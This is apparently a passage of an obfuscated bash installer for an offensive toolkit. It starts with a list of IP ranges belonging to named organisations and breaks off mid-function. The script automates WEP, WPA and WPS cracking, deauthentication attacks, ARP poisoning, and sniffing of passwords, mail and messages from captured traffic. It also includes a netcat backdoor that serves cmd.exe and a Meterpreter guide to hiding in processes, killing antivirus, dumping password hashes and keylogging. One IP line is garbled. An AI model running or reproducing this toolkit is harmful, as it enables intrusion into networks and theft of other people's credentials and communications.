207.60.36.32 - 207.60.36.39 Seabass Dreams Too Much, Inc
207.60.36.40 - 207.60.36.47 Next Ticketing
207.60.36.48 - 207.60.36.55 Dulsi
207.60.36.56 - 207.60.36.63 The Internet Access Company
207.60.36.64 - 207.60.36.71 Maguire Group
207.60.36.72 - 207.60.36.79 Cogenex
207.60.36.88 - 207.60.36.95 AKNDC
207.60.36.96 - 207.60.36.103 McGovern election commitee
207.60.36.104 - 207.60.36.111 Digital Equipment Corp
207.60.36.112 - 207.60.36.119 PTR - Precision Technologies
207.60.36.120 - 207.60.36.127 Extech
207.60.36.128 - 207.60.36.135 Manfreddi Architects
207.60.36.144 - 207.60.36.151 Parent Naffah
207.60.36.152 - 207.60.36.159 Darling Dolls Inc
207.60.36.160 - 207.60.36.167 Wright Communications
207.60.36.168 - 207.60.36.175 Principle Software
207.60.36.176 - 207.60.36.183 Chris Pet Store
207.60.36.184 - 207.60.36.191 Fifteen Lilies
207.60.36.192 - 207.60.36.199 All-Com Technologies
207.60.37.0 - 207.60.37.31 Cardio Thoracic Surgical Associates, P. A.
207.60.37.32 - 207.60.37.63 Preferred Fixtures Inc
207.60.37.64 - 207.60.37.95 Apple and Eve Distributors
207.60.37.96 - 207.60.37.127 Nelson Copy Supply
207.60.37.128 - 207.60.37.159 Boston Optical Fiber
207.60.37.192 - 207.60.37.223 Fantasia&Company
207.60.41.0 - 207.60.41.255 Infoactive
207.60.48.0 - 207.60.48.255 Curry College
207.60.62.32 - 207.60.62.63 Alternate Power Source
207.60.62.64 - 207.60.62.95 Keystone Howley-White
207.60.62.128 - 207.60.62.159 Bridgehead Associates LTD
207.60.62.160 - 207.60.62.191 County Supply
207.60.62.192 - 207.60.62.223 NH Board of Nursing
207.60.64.0 - 207.60.64.63 Diversified Wireless Technologies
207.60.64.64 - 207.60.64.127 Phytera
207.60.66.0 - 207.60.66.15 The Network Connection
207.60.66.16 - 207.60.66.31 Young Refrigeration
207.60.66.32 - 207.60.66.47 Vision Appraisal Technology
207.60.66.48 - 207.60.66.63 EffNet Inc
207.60.66.64 - 207.60.66.79 Entropic Systems Inc
207.60.66.80 - 207.60.66.95 Finley Properties
207.60.66.96 - 207.60.66.111 Nancy Plowman Associates
207.60.66.112 - 207.60.66.127 Northeast Financial Strategies
207.60.66.128 - 207.60.66.143 Textnology Corp
207.60.66.144 - 207.60.66.159 Groton Neochem LLC
207.60.66.160 - 207.60.66.175 Tab Computers
207.60.66.176 - 207.60.66.191 Patrons Insurance
207.60.66.192 - 207.60.66.207 Chair City Web
207.60.66.208 - 207.60.66.223 Radex, Inc.
207.60.66.224 - 207.60.66.239 Robert Austein
207.60.66.240 - 207.60.66.255 Hologic Inc.
207.60.71.64 - 207.60.71.127 K-Tech International Inc.
207.60.71.128 - 207.60.71.191 Pan Communications
207.60.71.192 - 207.60.71.255 New England College of Finance
207.60.75.128 - 207.60.75.255 Absolve Technology
207.60.78.0 - 207.60.78.127 Extech
207.60.78.128 - 207.60.78.255 The Insight Group
207.60.83.0 - 207.60.83.255 JLM Technologies
207.60.84.0 - 207.60.84.255 Strategic Solutions
207.60.94.0 - 207.60.94.15 McWorks
207.60.94.32 - 207.60.94.47 Rooney RealEstate
207.60.94.48 - 207.60.94.63 Joseph Limo Service
207.60.94.64 - 207.60.94.79 The Portico Group
207.60.94.80 - 207.60.94.95 Event Travel Management Inc
207.60.94.96 - 207.60.94.111 Intellitech International
207.60.94.128 - 207.60.94.143 Orion Partners
207.60.94.144 - 207.60.94.159 Rainbow Software Solution
207.60.94.160 - 207.60.94.175 Grason Stadler Inc
207.60.94.192 - 207.60.94.207 Donnegan System
207.60.95.1 - 207.60.95.255 The Iprax Corp
207.60.102.0 - 207.60.102.63 Coporate IT
207.60.102.64 - 207.60.102.127 Putnam Technologies
207.60.102.128 - 207.60.102.191 Sycamore Networks
207.60.102.192 - 207.60.102.255 Bostek
2?7.6?.10?.128 - 207.60.103.255 Louis Berger and Associates
207.60.104.128 - 207.60.104.191 Hanson Data Systems
207.60.106.128 - 207.60.106.255 Giganet Inc.
207.60.107.0 - 207.60.107.255 Roll Systems
207.60.108.8 - 207.60.108.15 InternetQA
207.60.111.0 - 207.60.111.31 Reading Cooperative Bank
207.60.111.32 - 207.60.111.63 Edco collaborative
207.60.111.64 - 207.60.111.95 DTC Communications Inc
207.60.111.96 - 207.60.111.127 Mike Line
207.60.111.128 - 207.60.111.159 The Steppingstone Foundation
207.60.111.160 - 207.60.111.191 Caton Connector
207.60.111.192 - 207.60.111.223 Refron
207.60.111.224 - 207.60.111.255 Dolabany Comm Group
207.60.112.0 - 207.60.112.255 The CCS Companies
207.60.116.0 - 207.60.116.255 Continental PET Technologies
207.60.122.16 - 207.60.122.23 Corey & Company Designers Inc
207.60.122.24 - 207.60.122.31 SAIC
207.60.122.32 - 207.60.122.39 Netserve Entertainment Group
207.60.122.40 - 207.60.122.47 Avici Systems Inc
207.60.122.48 - 207.60.122.55 Webrdwne
207.60.122.56 - 207.60.122.63 Reality and Wonder
207.60.122.64 - 207.60.122.71 Nishan Desilva
207.60.122.72 - 207.60.122.79 NemaSoft Inc
207.60.122.80 - 207.60.122.87 Patrick Murphy
207.60.122.88 - 207.60.122.95 Corey and Company
207.60.122.96 - 207.60.122.103 Ames Textile Corp
207.60.122.104 - 207.60.122.111 Publicom
207.60.127.0 - Northstar Technologies
207.60.128.0 - 207.60.128.255 Northstar Technologies
207.60.129.0 - 207.60.129.255 Sanga Corp
207.60.129.64 - 207.60.129.127 Fired Up Network
207.60.129.128 - 207.60.129.191 Integrated Data Solutions
207.60.129.192 - 207.60.129.255 Metanext
207.61.* WorldLinx Telecommunications, Inc., Canada
207.120.* BBN Planet, MA £+

cat harrypottera | grep £+harrypotterb£+

" | sed -e 's/harrypotter/$/g'  | sed -e 's/£+/"/g' >> famousip.sh

}

f_writing_famous_IP

cd $HOME

ln -sf /opt/darkeffe/famousip.sh /usr/local/bin/famousip 1> /dev/null

}

f_famous_IP

f_fenrir () {

echo "  [*] Fenrir"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f fenrir.sh 1> /dev/null
touch fenrir.sh 1> /dev/null

f_writing_fenrir () {

echo "#!/bin/bash

# Timelapsed
timelapsed () {

	k=1
	until [ -e harrypotterHOME/pio.txt ]; do
		sleep 1
		if [ harrypotterk -lt 10 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 10 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 100 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 1000 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 10000 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\b\c£+
		else [ harrypotterk -ge 100000 ]
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\b\b\c£+
		fi
		k=harrypotter[ harrypotterk + 1 ]
	done
	# use:
	# echo -n £+what i am doing £+
	# timelapsed &
	# touch harrypotterHOME/pio.txt
	# sleep 1
	# rm -f harrypotterHOME/pio.txt
	# echo £+£+

}

##################################################################################

# Programs Functions

##################################################################################

f_metasploit () {

f_meterpreter () {

f_art
echo £+#######################################################£+
echo £+[*] Meterpreter£+
echo £+#######################################################£+

echo £+£+

echo £+help ----------------> will show a list of possible commands£+
echo £+use priv  |  help ---> will show two hidden commands£+

echo £+£+

echo £+Hide Yourself in an Existing Process: £+
echo £+1) ps --------------> show the running process and theirs ID£+
echo £+2) migrate ID -------------> hide you in a running process, use£+
echo £+                             some that is not going to be£+
echo £+                             closed by the user, it can fail£+
echo £+3) find antivirus and stop them with KILL ID(Antivirus ID)£+

echo £+£+

echo £+Information Gathering : £+
echo £+getuid -------> show all the logged users£+
echo £+idletime ---------> show the time that the user has been inactive£+
echo £+sysinfo -----------> show the computer name, architecture and language£+
echo £+hashdump ------------> dump the SAM file with the user's hashes£+

echo £+Uictl Enable/Disable : £+
echo £+uictl enable/disable keyboard  -------> enable/disable the keyboard£+
echo £+uictl enable/disable mouse  ----------> enable/disable the mouse£+

echo £+shell ----------------------------> run command on the victim's system£+


echo £+SCRIPTS : £+
echo £+list ------------> bash: cd /opt/metasploit/msf3/scripts/meterpreter && ls *£+
echo £+help ------------> help nomescript£+
echo £+run scripts --------> run nomescript£+
echo £+  [*] run winenum   ---------> script to acquire tonns of usefull information , logged in /root/.msf3£+
echo £+  [*] run killav    ---------> script to kill all the antivirus£+
echo £+                               that he can manage to£+
echo £+  [*] run gettelnet -u USER -p PASSWORD --------------> create a telnet account to witch you can log on£+
echo £+  [*] run keylogrecorder ------------------> log all the key pressed to /root/.msf3/logs/keylogrecorder£+

}

f_meterpreter

}

f_netcat () {

# http://joncraton.org/files/nc111nt.zip
# BackDoor
echo £+victim (until connection ends): nc -l -p PORT -vv -e cmd.exe£+
echo £+       (permanent, last forever) : nc -L -p PORT -vv -e cmd.exe£+
echo £+attacker : nc VictimIP PORT -vv£+

}


f_interface_monitor_down () {

	echo £+[*] Putting Up harrypotterinterface, Disabiliting Monitor Mode And Ripristinating MAC ...£+
	ifconfig harrypotterinterface_monitor down 1> /dev/null 2> /dev/null
	ifconfig harrypotterinterface down 1> /dev/null 2> /dev/null
	airmon-ng stop harrypotterinterface_monitor 1> /dev/null 2> /dev/null
	airmon-ng stop harrypotterinterface 1> /dev/null 2> /dev/null
	ifconfig harrypotterinterface up 1> /dev/null 2> /dev/null
	macchanger --mac harrypotteroriginalmac harrypotterinterface 1> /dev/null 2> /dev/null

}

f_interface_monitor_up () { # interface | fakemac


	echo £+[*] Stopping harrypotterinterface ... £+
	airmon-ng stop harrypotterinterface 1> /dev/null 2> /dev/null
	ifconfig harrypotterinterface down 1> /dev/null 2> /dev/null

	echo £+[*] Changing MAC to harrypotterfakemac ... £+
	originalmac=harrypotter( ifconfig harrypotterinterface | grep £+HWaddr£+ | tr ' ' '\012' | sort -u | head -n 2 | tail -n 1 )
	macchanger --mac harrypotterfakemac harrypotterinterface 1> /dev/null 2> /dev/null

	echo £+[*] Starting harrypotterinterface ... £+
	airmon-ng start harrypotterinterface 1> /dev/null 2> /dev/null
	interface_monitor=harrypotter( iwconfig 2> /dev/null | grep £+Mode:Monitor£+ | awk '{print harrypotter1}' )

}

f_return_to_menu () {

	sleep 5
	echo £+£+
	echo £+£+
	echo £+[*] Now Returning To The Main Menu ...£+
	sleep 3
	f_menu

}

##################################################################################

# Scripts Functions

##################################################################################

f_wireless () {

	f_wireless_wep_passcrack () {

		f_art

		echo -n £+Write the interface that you wanna use (es : wlan0 ) : £+
		read interface

		echo -n £+Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : £+
		read fakemac

		f_interface_monitor_up

		f_art
		echo £+[*] Now it Will be started Airodump-ng on harrypotterinterface_monitor,£+
		echo £+    where you can find information about the Wireless Network£+
		sleep 3
		( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng harrypotterinterface_monitor ) &

		f_art
		echo -n £+Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : £+
		read bssid

		echo -n £+Write the Essid Name (es : WiFiNetwork ) : £+
		read essid

		f_art
		echo -n £+Calculating The Key ... £+
		timelapsed &
		wesside-ng -i harrypotterinterface -a harrypotterfakemac -v harrypotterbssid >> harrypotterHOME/wepkey2.txt
		cat harrypotterHOME/wepkey2.txt | grep £+KEY=(£+ | awk '{print harrypotter2}' | sed -e 's/KEY=(//' | sed -e 's/)//' | sed -e 's/://g' | sort -u >> wepkey.txt
		rm -f wepkey2.txt
		wepkey=harrypotter(cat wepkey.txt )

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		f_interface_monitor_down

		f_art

		echo £+The Password Of The Essid harrypotteressid is : harrypotterwepkey£+
		echo £+Wich Is Saved In harrypotterHOME/wepkey.txt£+

		f_return_to_menu

	}

	f_wireless_wpa_passcrack () {

		f_pyrit_attackdb () {

			f_art
			echo £+[*] Attacking the WpaKey With The Pyrit Database ...£+
			pyrit -e harrypotteressid -r harrypottercap_path/harrypottercap_name-01.cap attack_db

			sleep 10

			f_art
			f_interface_monitor_down

			echo £+[*] Deletting harrypottercap_name-01.cap ...£+
			rm -f harrypottercap_path/harrypottercap_name-01.cap 1> /dev/null 2> /dev/null

			f_art

			f_return_to_menu
		}

		f_pyrit_generate_db () {

			f_art
			echo £+[*] Generating An Entry In The Pyrit Database For harrypotteressid ...£+
			pyrit -e harrypotteressid create_essid 1>  /dev/null 2> /dev/null
			pyrit batch

			sleep 10

			f_art
			f_interface_monitor_down

			f_return_to_menu

		}

		f_pyrit_generate_attack_db () {

			f_art
			echo £+[*] Generating An Entry In The Pyrit Database For harrypotteressid ... £+
			timelapsed &
			pyrit -e harrypotteressid create_essid 1>  /dev/null 2> /dev/null
			echo -n £+[*] Processing The Database... £+
			timelapsed &
			pyrit batch 1> /dev/null 2> /dev/null
			echo £+[*] Attacking the WpaKey With The Pyrit Database ... £+
			pyrit -e harrypotteressid -r harrypottercap_path/harrypottercap_name-01.cap attack_db

			touch harrypotterHOME/pio.txt 1> /dev/null 2> /dev/null
			sleep 1
			rm -f harrypotterHOME/pio.txt 1> /dev/null 2> /dev/null
			echo £+£+

			echo £+£+
			echo £+Copy the password to a file (30s) : £+

			k=1
			until [ harrypotterk -gt 30 ]; do
				sleep 1
				if [ harrypotterk -lt 10 ]; then
					echo -en  £+[harrypotterk s]\b\b\b\b\b\c£+
				else
					echo -en  £+[harrypotterk s]\b\b\b\b\b\b\c£+
				fi
				k=harrypotter[ harrypotterk + 1 ]
			done

			f_interface_monitor_down

			echo £+[*] Deletting harrypottercap_name-01.cap ...£+
			rm -f harrypottercap_path/harrypottercap_name-01.cap 1> /dev/null 2> /dev/null

			f_art

			f_return_to_menu
		}

		f_pyrit_attack_passthrough () {

			f_art
			echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
			read wordlist

			f_art
			echo £+[*] Attacking the WpaKey With Pyrit ...£+
			roxterm -e echo pyrit -e harrypotteressid -i harrypotterwordlist -r harrypottercap_path/harrypottercap_name-01.cap attack_passthrough

			echo £+£+
			echo £+Copy the password to a file (30s) : £+

			k=1
			until [ harrypotterk -gt 30 ]; do
				sleep 1
				if [ harrypotterk -lt 10 ]; then
					echo -en  £+[harrypotterk s]\b\b\b\b\b\c£+
				else
					echo -en  £+[harrypotterk s]\b\b\b\b\b\b\c£+
				fi
				k=harrypotter[ harrypotterk + 1 ]
			done

			f_interface_monitor_down

			f_art

			f_return_to_menu

		}

		f_aircrack_attack () {

			f_art
			echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
			read wordlist

			clear
			echo -n £+Enter The Output File For The Password (es: /home/user/wpapass.txt ) : £+
			read filetmp

			f_art
			echo £+[*] Attacking the WpaKey With Aircrack-NG ...£+
			aircrack-ng -e harrypotteressid -w harrypotterwordlist -b harrypotterbssid -l harrypotterfiletmp harrypottercap_path/harrypottercap_name-01.cap

			f_art

			cat filetmp

			sleep 10

			f_interface_monitor_down

			f_return_to_menu

		}

		f_art

		echo -n £+Enter the Interface To Use (es: wlan0) : £+
		read interface

		echo -n £+Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : £+
		read fakemac

		f_interface_monitor_up

		f_art
		echo £+[*] Now it Will be started Airodump-ng on harrypotterinterface_monitor,£+
		echo £+    where you can find information about the Wireless Network£+
		sleep 7
		( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng harrypotterinterface_monitor ) &

		f_art
		echo -n £+Write the channel of the network (es : 11 ) : £+
		read channel

		echo -n £+Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : £+
		read bssid

		echo -n £+Write the Essid Name (es : WiFiNetwork ) : £+
		read essid

		echo -n £+Write The Client MAC (es : 00:19:A1:11:AV:45 ) : £+
		read maclient

		echo -n £+Select the output cap file path (es : /home/user/cap ) : £+
		read cap_path

		echo -n £+Enter The Cap File Name(es lancap ) : £+
		read cap_name

		killall airodump-ng

		( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng -c harrypotterchannel -w harrypottercap_path/harrypottercap_name --bssid harrypotterbssid harrypotterinterface_monitor ) &


		f_deauth () {
			k=0
			until [ -e harrypotterHOME/go.txt ]; do
				k=harrypotter[ harrypotterk + 1 ]
				( xterm -geometry 75x25+700+40 -T £+Aireplay-NG (harrypotterk)£+ -e aireplay-ng --deauth 0 ­-a harrypotterbssid ­-c harrypottermaclient harrypotterinterface ) &
				sleep 15
			done

		}

		( f_deauth ) &

		a=1
		cont=0
		until [ harrypottera == harrypottercont ]; do
			f_art
			echo -n £+Press 1 when you receive the WPA HandShake : £+
			read cont
		done

		touch harrypotterHOME/go.txt 1> /dev/null 2> /dev/null
		sleep 2
		rm -f harrypotterHOME/go.txt 1> /dev/null 2> /dev/null

		pyritcho=100
		pyritattackdb=1
		pyritgeneratedb=2
		pyritgenerateattackdb=3
		pyritattack=4
		aircrackattack=5
		previousmenu=6
		mainmenu=7
		until [ harrypotterpyritcho == harrypotterpyritattackdb ] || [ harrypotterpyritcho == harrypotterpyritgeneratedb ] || [ harrypotterpyritcho == harrypotterpyritgenerateattackdb ] || [ harrypotterpyritcho == harrypotterpyritattack ] || [ harrypotterpyritcho == harrypotteraircrackattack ] || [ harrypotterpyritcho == harrypotterpreviousmenu ] || [ harrypotterpyritcho == harrypottermainmenu ]; do
			f_art
			echo £+Select What you wanna do : £+
			echo £+£+
			echo £+1) Attack The WpaKey With A Precalculated Database£+
			echo £+2) Create An Entry In The Database For The Essid And Process It£+
			echo £+3) Create an Entry In the Database For The Essid, Process It And Find The WpaKey£+
			echo £+4) Attack The WpaKey Directly With Pyrit£+
			echo £+5) Attack The WpaKey Directly With Aircrack-NG£+
			echo £+6) Previous Menu£+
			echo £+7) Main Menu£+
			echo £+£+
			echo -n £+Choice : £+
			read pyritcho
		done

		case harrypotterpyritcho in

		1) f_pyrit_attackdb  ;;

		2) f_pyrit_generate_db  ;;

		3) f_pyrit_generate_attack_db ;;

		4) f_pyrit_attack_passthrough  ;;

		5) f_aircrack_attack ;;

		6) 	f_interface_monitor_down ;
			f_wireless ;;

		7)  f_interface_monitor_down ;
			f_menu ;;

		esac

	}

	f_wireless_wpa_wpscrack () {

		f_art
		echo -n £+Write the interface that you wanna use (es : wlan0 ) : £+
		read interface

		echo -n £+Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : £+
		read fakemac

		f_interface_monitor_up

		interface_monitor=harrypotter( iwconfig 2> /dev/null | grep £+Mode:Monitor£+ | awk '{print harrypotter1}' )

		f_art
		echo £+[*] Now it Will be started Airodump-ng on harrypotterinterface_monitor,£+
		echo £+    where you can find information about the Wireless Network£+
		sleep 5
		( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng harrypotterinterface_monitor ) &

		f_art
		echo -n £+Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : £+
		read bssid

		echo -n £+Write the channel of the network (es : 11 ) : £+
		read channel

		f_art
		echo £+Now Running Reaver, To Bruteforce The WPS Pin ...£+
		echo £+£+
		reaver --interface=harrypotterinterface_monitor --bssid=harrypotterbssid --channel=harrypotterchannel -vv

		f_interface_monitor_down

		f_art

		f_return_to_menu

	}

	f_wireless_decrypt () {

		encryption=0
		wep=1
		wpa=2
		until [ harrypotterencryption == harrypotteruncrypted ] || [ harrypotterencryption == harrypotterwep ] || [ harrypotterencryption == harrypotterwpa ]; do
			f_art
			echo £+Encryption Protocol Selection : £+
			echo £+£+
			echo £+1) Wep Encryption£+
			echo £+2) Wpa/Wpa2 Encryption£+
			echo £+3) Return to the Previous Menu£+
			echo £+£+
			echo -n £+Choice : £+
			read encryption
		done

		if [ harrypotterencryption != harrypotterwep ] || [ harrypotterencryption != harrypotterwpa ]; then
			f_wireless
		fi

		if [ harrypotterwirelesscho != £+98£+ ]; then
			echo £+Insert The Path Of The .cap file£+
			if [ harrypotterencryption == harrypotterwpa ]; then
				echo £+(with the four way handshake if wpa/wpa2)£+
			fi
			echo -n £+es: /home/user : £+
			read cap_path

			echo £+Insert The Name Of The .cap file£+
			if [ harrypotterencryption == harrypotterwpa ]; then
				echo £+(with the four way handshake if wpa/wpa2)£+
			fi
			echo -n £+es: wlan-01.cap : £+
			read cap_name
		else
			cap_path=harrypotter( cat harrypotterHOME/cap_path.tmp )
			cap_name=harrypotter( cat harrypotterHOME/cap_name.tmp )
			rm -f harrypotterHOME/cap_path.tmp
			rm -f harrypotterHOME/cap_name.tmp
		fi

		echo -n £+Insert The Wireless Key : £+
		read passkey

		if [ harrypotterencryption == harrypotterwep ]; then
			f_art
			airdecap-ng -e harrypotteressid -w harrypotterpasskey harrypottercap_path/harrypottercap_name
		fi
		if [ harrypotterencryption == harrypotterwpa ]; then
			f_art
			airdecap-ng -e harrypotteressid -p harrypotterpasskey harrypottercap_path/harrypottercap_name
		fi


		cap_name=harrypotter( echo harrypottercap_name | sed -e 's/.cap/-dec.cap/' )

		f_art
		echo £+Your Decrypted Cap File Is In harrypottercap_path/harrypottercap_name !!!£+

		if [ harrypotterwirelesscho == harrypotterdecrypt ]; then
			f_return_to_menu
		else
			a=0
			until [ harrypottera == £+1£+]; do
				echo £+£+
				echo -n £+Press 1 to exit : £+
				read a
			done
			touch decrypted_fin.txt.tmp
			echo £+1£+ > decrypted_fin.txt.tmp
			f_return_to_menu
		fi

	}

	f_wireless_arp () {

		f_wireless_arp_analise_dec () {

			f_art
			echo £+Insert The Path Of The .cap file£+
			echo -n £+es: /home/user : £+
			read cap_path
			echo £+£+
			echo £+Insert The Name Of The .cap file£+
			echo -n £+es: wlan-01.cap : £+
			read cap_name

			echo -n £+Enter A Dir For Log File (es /home/user/lanlog ) : £+
			read logdir
			if [ ! -e harrypotterlogdir ]; then
				mkdir -p harrypotterlogdir
			fi

			f_art

			echo £+[*] Driftnet (Images Sniffing) ...£+
			mkdir -p harrypotterlogdir/driftnet
			driftnet -f harrypottercap_path/harrypottercap_name -a -d harrypotterlogdir/driftnet -m 100000 -s 1> /dev/null 2> /dev/null

			echo £+[*] Dsniff ...£+
			dsniff -f harrypottercap_path/harrypottercap_name -w harrypotterlogdir/dsniff.txt 1> /dev/null 2> /dev/null

			echo £+[*] Filesnarf ...£+
			mkdir -p harrypotterlogdir/filesnarf
			cd harrypotterlogdir/filesnarf
			filesnarf -p harrypottercap_path/harrypottercap_name 1> /dev/null 2> /dev/null
			cd ..

			echo £+[*] Mailsnarf ...£+
			mailsnarf -p harrypottercap_path/harrypottercap_name  >> harrypotterlogdir/mailsnarf.txt 2> /dev/null

			echo £+[*] Msgsnarf ...£+
			msgsnarf -p harrypottercap_path/harrypottercap_name  >> harrypotterlogdir/msgsnarf.txt 2> /dev/null

			echo £+[*] Urlsnarf ...£+
			urlsnarf -p harrypottercap_path/harrypottercap_name  >> harrypotterlogdir/urlsnarf.txt 2> /dev/null

			f_return_to_menu

		}

		f_wireless_arp_analise_crypt () {

			f_art

			( xterm -geometry 75x25+700+40 -T £+Cap Decryption£+ -e f_wireless_decrypt ) &

			f_wireless_arp_analise_dec

		}

		f_wireless_arp_create_crypt () {

			f_art

			echo £+Insert The Path Of The .cap file£+
			echo -n £+es: /home/user : £+
			read cap_path
			echo £+£+
			echo £+Insert The Name Of The .cap file£+
			echo -n £+es: wlan-01.cap : £+
			read cap_name

			echo -n £+Write the interface that you wanna use (es : wlan0 ) : £+
			read interface

			echo -n £+Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : £+
			read fakemac

			f_interface_monitor_up

			interface_monitor=harrypotter( iwconfig 2> /dev/null | grep £+Mode:Monitor£+ | awk '{print harrypotter1}' )

			f_art
			echo £+[*] Now it Will be started Airodump-ng on harrypotterinterface_monitor,£+
			echo £+    where you can find information about the Wireless Network£+
			sleep 5
			( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng harrypotterinterface_monitor ) &

			f_art
			echo -n £+Write the channel of the network (es : 11 ) : £+
			read channel

			echo -n £+Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : £+
			read bssid

			echo -n £+Write The Client MAC (es : 00:19:A1:11:AV:45 ) : £+
			read maclient

			echo -n £+Write the Essid Name (es : WiFiNetwork ) : £+
			read essid

			f_art
			echo £+[*] Now it Will be Generated harrypottercap-01.cap£+
			( xterm -geometry 75x25+700+40 -T £+Airodump-NG£+ -e airodump-ng -c harrypotterchannel -w harrypottercap_path/harrypottercap_name --bssid harrypotterbssid harrypotterinterface_monitor ) &

			a=1
			cont=0
			until [ harrypottera == harrypottercont ]; do
				f_art
				echo £+£+
				echo -n £+Press 1 when you want to stop the sniffing : £+
				read cont
			done

			f_interface_monitor_down

			f_art
			echo £+The Cap File Was Generated In : harrypottercap_path/harrypottercap_name-01.cap£+

			sleep 15

			if [ harrypottercho == £+3£+ ]; then
				f_return_to_menu
			else
				rm -f harrypotterHOME/cap_path.tmp
				rm -f harrypotterHOME/cap_name.tmp
				echo £+harrypottercap_path£+ >> harrypotterHOME/cap_path.tmp
				echo £+harrypottercap_name-01.cap£+ >> harrypotterHOME/cap_name.tmp
			fi

		}

		f_wireless_arp_create_dec () {

			f_art
			f_wireless_arp_create_crypt

			wirelesscho=98
			decrypt=98

			f_wireless_decrypt

		}

		cap_dec=1
		cap_crypt=2
		cap_noexist_crypt=3
		cap_noexist_dec=4
		previousmenu=5
		cho=0
		until [ harrypottercho == harrypottercap_dec ] || [ harrypottercho == harrypottercap_crypt ] || [ harrypottercho == harrypottercap_noexist_crypt ] || [ harrypottercho == harrypottercap_noexist_dec ] || [ harrypottercho == harrypotterpreviousmenu ]; do
			f_art
			echo £+Select An Option : £+
			echo £+£+
			echo £+1) Analise An Existing Decrypted Cap File£+
			echo £+2) Analise An Existing Crypted Cap File£+
			echo £+3) Create A Crypted Cap File£+
			echo £+4) Create A  Decrypted Cap File£+
			echo £+5) Return To The Previous Menu£+
			echo £+£+
			echo -n £+Choice : £+
			read cho
		done

		case harrypottercho in

		1) f_wireless_arp_analise_dec ;;

		2) f_wireless_arp_analise_crypt ;;

		3) f_wireless_arp_create_crypt ;;

		4) f_wireless_arp_create_dec ;;

		5) f_wireless ;;

		esac

	}

wirelesscho=10
wep=1
wpa=2
wps=3
decrypt=4
wireless_arp=5
mainmenu=6
until [ harrypotterwirelesscho == harrypotterwep ] || [ harrypotterwirelesscho == harrypotterwpa ] || [ harrypotterwirelesscho == harrypotterwps ] || [ harrypotterwirelesscho == harrypotterdecrypt ] || [ harrypotterwirelesscho == harrypotterwireless_arp ] || [ harrypotterwirelesscho == harrypottermainmenu ]; do
	clear
	f_art
	echo £+#############################################£+
	echo £+£+
	echo £+Selection£+
	echo £+£+
	echo £+1) Wep Encryption To Break£+
	echo £+2) Wpa/Wpa2 Encryption To Break£+
	echo £+3) WiFi Protected Setup (WPS) Crack£+
	echo £+4) Wireless Cap Decryption£+
	echo £+5) Wireless Arp Poisoning£+
	echo £+6) Return to the Main Menu£+
	echo £+£+
	echo -n £+Choice : £+
	read wirelesscho
done

case harrypotterwirelesscho in

1) f_wireless_wep_passcrack ;;

2) f_wireless_wpa_passcrack ;;

3) f_wireless_wpa_wpscrack ;;

4) f_wireless_decrypt ;;

5) f_wireless_arp ;;

6) f_menu ;;

esac

}

f_lanattack () {

	f_lanattack_alive_host () {

		f_art

		if [ harrypotterlancho == harrypotterlalivehost ]; then
			echo -n £+Enter The Interface : £+
			read interface
		fi

		echo £+[*] Launching Netdiscover, to identify Host ...£+

		if [ -e £+/netdiscover.txt£+ ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e £+/netdiscover.sh£+ ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover
		( netdiscover -p -P -N -i harrypotterinterface >> /netdiscover.txt 2> /dev/null ) &

		echo £+#!/bin/bash£+ >> /netdiscover.sh
		echo £+until [ -e £+/goes.txt.back.tack.pap£+ ]; do£+ | sed -e 's/£+/£+/g' >> /netdiscover.sh
		echo £+	clear£+ >> /netdiscover.sh
		echo £+	cat netdiscover.txt | sort -u | awk '{print harrypotter1}'£+ | sed -e 's/harrypotter/harrypotter/g' >> /netdiscover.sh
		echo £+	sleep 5£+ >> /netdiscover.sh
		echo £+done£+ >> /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T £+ IP List £+ -e bash /netdiscover.sh ) &
		a=1
		cont=0
		until [ harrypottera == harrypottercont ]; do
			f_art
			echo -n £+Press 1 when you want to stop the search : £+
			read cont
		done

		rm -f /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e £+/netdiscover.txt.tmp.back£+ ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi

		f_art

		if [ harrypotterlancho == harrypotterlalivehost ]; then
			f_return_to_menu
		fi

	}

	f_lanattack_arp_attack () {

		f_art

		echo £+1£+ > /proc/sys/net/ipv4/ip_forward

		echo -n £+Enter The Interface : £+
		read interface

		echo £+[*] Launching Netdiscover, to identify Host ...£+

		if [ -e £+/netdiscover.txt£+ ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e £+/netdiscover.sh£+ ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover
		( netdiscover -p -P -N -i harrypotterinterface >> /netdiscover.txt 2> /dev/null ) &

		echo £+#!/bin/bash£+ >> /netdiscover.sh
